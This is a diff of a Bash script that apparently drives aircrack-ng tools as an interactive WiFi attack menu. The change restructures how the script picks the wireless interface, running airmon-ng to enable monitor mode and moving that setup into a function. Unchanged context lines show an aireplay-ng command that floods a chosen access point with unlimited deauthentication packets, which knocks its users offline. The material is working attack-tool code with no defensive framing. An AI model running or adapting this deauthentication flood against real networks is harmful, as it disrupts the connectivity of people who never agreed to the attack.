@@ -52,43 +52,7 @@ echo -e "${ENDCOLOR}"
 echo ""
 read MONIF
 clear
-
-if [[ $MONIF == 'y' ]]; then
-echo ""
-iwconfig
-echo -e "${YELL}"
-echo "Please type the  wireless interface from above"
-echo -e "${ENDCOLOR}"
-echo ""
-read WIRELESS
-[[ $WIRELESS == "" ]]
-sleep 1
-clear
-echo -e "${YELL}"
-echo "Starting interface on $WIRELESS..."
-echo -e "${ENDCOLOR}"
-sleep 1
-airmon-ng start $WIRELESS
-sleep 4
-clear
-else
-echo ""
-echo -e "${YELL}"
-echo "Skipping..."
-echo -e "${ENDCOLOR}"
-sleep 2
-clear
-fi
-
-
-
-if [[ $WIRELESS == 'wlan0' ]];
-then
-echo ""
-wire=wlan0mon
-else
-wire=mon0
-fi
+function_mon(){
 echo -e "${YELL}"
 echo "Your new WiFI interface is $wire"
 echo -e "${ENDCOLOR}"
@@ -170,7 +134,7 @@ echo "Sending Deauthentication packets to to specified network...[Ctrl+C to stop
 echo -e "${ENDCOLOR}"
 sleep 1
 aireplay-ng --deauth 0 -a $BSSID $wire
-sleep 2
+sleep 6
 clear
 else
 echo ""
@@ -180,4 +144,51 @@ echo -e "${ENDCOLOR}"
 sleep 2
 clear
 fi
+}
+if [[ $MONIF == 'y' ]]; then
+echo ""
+iwconfig
+echo -e "${YELL}"
+echo "Please type the  wireless interface from above : "
+echo -e "${ENDCOLOR}"
+echo ""
+read WIRELESS
+    if [[ $WIRELESS == 'wlan0mon' ]]; then
+    echo ""
+    wire=$WIRELESS
+    function_mon
+    #echo "Already in monitor mode"
+
+    elif [[ $WIRELESS == 'mon0' ]]; then
+    echo ""
+    wire=$WIRELESS
+    function_mon
+
+    elif [[ $WIRELESS == 'wlan0' ]]; then
+    echo ""
+    echo -e "${YELL}"
+    echo "Starting interface on $WIRELESS..."
+    echo -e "${ENDCOLOR}"
+    sleep 1
+    airmon-ng start $WIRELESS
+    sleep 4
+    clear
+    iwconfig
+    echo -e "${YELL}"
+    echo "Please type the new wireless interface after starting moniter mode from above : "
+    echo -e "${ENDCOLOR}"
+    echo ""
+    read MONITER
+    wire=$MONITER
+    function_mon
+    fi
+else
+echo ""
+echo -e "${YELL}"
+echo "Skipping..."
+echo -e "${ENDCOLOR}"
+sleep 2
+clear
+fi
+
 
